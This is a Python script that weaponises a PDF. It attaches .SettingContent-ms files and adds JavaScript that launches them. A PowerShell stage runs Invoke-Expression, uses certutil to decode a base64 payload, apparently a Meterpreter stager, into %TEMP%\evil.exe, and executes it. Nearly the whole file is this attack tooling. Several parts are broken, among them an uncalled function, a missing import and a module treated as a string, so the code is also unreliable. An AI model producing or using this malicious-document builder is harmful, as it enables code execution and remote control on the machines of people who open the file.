import os
import sys
import pypdftk as scm
import re
import base64

from PyPDF2 import PdfFileWriter, PdfFileReader

payload = "meterpreter-64-take-6.ps1"
output = "new.pdf"
inp = "sample.pdf"

def addJS():

    malicious_pdf = PdfFileWriter()

    # Open file passed as -i parameter
    with open(inp, "rb") as f:

            pdfReader = PdfFileReader(f)

            # Copy pages of original pdf file to malicious pdf file

            for page in range(pdfReader.numPages):

                pageObj = pdfReader.getPage(page)

                malicious_pdf.addPage(pageObj)

            malicious_pdf.addJS("var files = [\"Payload\", \"psFile\"]; for (var i = 0; i < files.length; i++) { this.exportDataObject( {cName: files[i] + \".SettingContent-ms\", nLaunch: 2} ); }")


            # Create malicious pdf using -o parameter as file name

            output = open(output, "wb+")

            malicious_pdf.write(output)

            output.close()

    f.close()
        
# Check if payload provided is base64 encoded
def isBase64(payload, filename):
    isb64 = True
    if(filename.endswith('.b64')):
        try:
            base64.b64decode(payload)
        except binascii.Error:
            isb64 = False
    else:
        isb64 = False
    print(str(payload))
    #base64.b64decode(payload)
    #print(str(payload))
    return isb64
    
# Create payload file to embed
def create_putfile(payload, b64):
    print("before putfile")
    putfile = payload.split("\n")
    print("after putfile")
    if b64:
        payload = payload.decode()
        payload = payload.split('\n')
        payload = "".join(payload)
        putfile[6] = "Write-Output \"" + payload + "\" > $env:TEMP\\evil.b64 \n"
    else:
        print("got here")
        payload = base64.b64encode(payload)
        payload = payload.decode()
        payload = payload.split('\n')
        payload = "".join(payload)
        
        putfile[6] = "Write-Output \"" + payload + "\" > $env:TEMP\\evil.b64 \n"
    
    return "\n".join(putfile)
    
# Create powershell script to embed in file and execute payload
def create_powershell():
    psFile = scm.split("\n")
    psFile[5] = "';$Store = $Store -replace([regex]::Escape($fpath + ':7:'), '');$Store = $Store -replace('', '');Invoke-Expression $Store; certutil -decode $env:TEMP\evil.b64 $env:TEMP\evil.exe; Invoke-Expression ($env:TEMP + '\evil.exe')]]>"
    
    return "\n".join(psFile)


def insertMaliciousFiles():
     
    raw_payload = ""
    # Read contents of payload file
    with open(payload, "rb") as pd:
        raw_payload = pd.read()
    print(raw_payload)
    #payload.close()
    # Check if payload is base64 encoded
    var = isBase64(raw_payload, payload)
    print(str(var))
    # Create malicious files
    putFile = create_putfile(raw_payload, var)
    psFile = create_powershell()
    files = [putFile, psFile]
    fileNames = ["Payload.SettingContent-ms", "psFile.SettingContent-ms"]
    # Create the files, write to them and then attach them using pdftk
    malput = [output]
    fileNames.append(malput[0])
    for i in range(len(files)):
        tmp = open(fileNames[i], "w")
        tmp.write(files[i])
        tmp.close()
        malput.append('out' + str(i) + '.pdf' )
        fileNames.append(malput[i+1])
        os.system('pdftk ' + malput[i] + ' attach_file ' + fileNames[i] + ' output ' + malput[i+1])
    
    print("Attached encoded files!")
    return fileNames
    
    
    
insertMaliciousFiles()
